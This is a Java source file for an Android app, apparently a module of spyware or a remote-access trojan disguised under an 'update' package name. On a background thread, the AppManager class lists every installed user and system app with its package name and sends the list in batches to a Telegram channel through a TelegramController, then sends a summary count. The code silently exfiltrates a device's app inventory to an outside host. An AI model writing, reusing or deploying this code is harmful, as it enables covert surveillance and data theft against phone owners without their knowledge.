package com.kasari.update;

import android.content.Context;
import android.content.pm.*;
import java.util.*;

public class AppManager {

    public static void sendInstalledApps(Context ctx) {
        new Thread(() -> {
            PackageManager pm = ctx.getPackageManager();
            List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            // Sort: user apps first, then system apps
            apps.sort((a, b) -> {
                boolean aUser = (a.flags & ApplicationInfo.FLAG_SYSTEM) == 0;
                boolean bUser = (b.flags & ApplicationInfo.FLAG_SYSTEM) == 0;
                if (aUser != bUser) return aUser ? -1 : 1;
                return a.loadLabel(pm).toString().compareToIgnoreCase(b.loadLabel(pm).toString());
            });

            StringBuilder sb = new StringBuilder();
            int userCount = 0, sysCount = 0;
            boolean inSys = false;

            for (ApplicationInfo ai : apps) {
                boolean isUser = (ai.flags & ApplicationInfo.FLAG_SYSTEM) == 0;
                if (!inSys && !isUser) {
                    sb.append("\n─── System Apps ───\n");
                    inSys = true;
                }
                String label = ai.loadLabel(pm).toString();
                sb.append(isUser ? "📱 " : "⚙️ ")
                  .append(label).append("\n   ").append(ai.packageName).append("\n");
                if (isUser) userCount++; else sysCount++;

                // Batch send every 30 entries
                if ((userCount + sysCount) % 30 == 0) {
                    TelegramController.sendMessage(sb.toString());
                    sb.setLength(0);
                    try { Thread.sleep(400); } catch (Exception ignored) {}
                }
            }
            if (sb.length() > 5) TelegramController.sendMessage(sb.toString());
            TelegramController.sendMessage(
                "✅ Apps done.\n📱 User: " + userCount + "\n⚙️ System: " + sysCount);
        }).start();
    }
}
